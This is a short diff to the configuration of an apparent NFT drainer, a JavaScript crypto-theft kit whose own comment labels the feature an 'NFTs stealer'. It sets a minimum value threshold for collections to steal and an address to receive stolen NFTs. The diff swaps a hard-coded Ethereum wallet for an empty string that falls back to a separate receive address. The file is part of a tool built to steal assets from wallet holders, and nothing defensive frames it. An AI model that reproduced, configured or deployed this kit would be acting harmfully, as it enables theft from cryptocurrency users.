@@ -29,7 +29,7 @@ const claimPageInfo = {
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.25,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "0x037E37d57Cd6d59aB66c2592af20EB53e15c2118" // leave empty if you want to use the same as receiveAddress 
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
 const customStrings = {
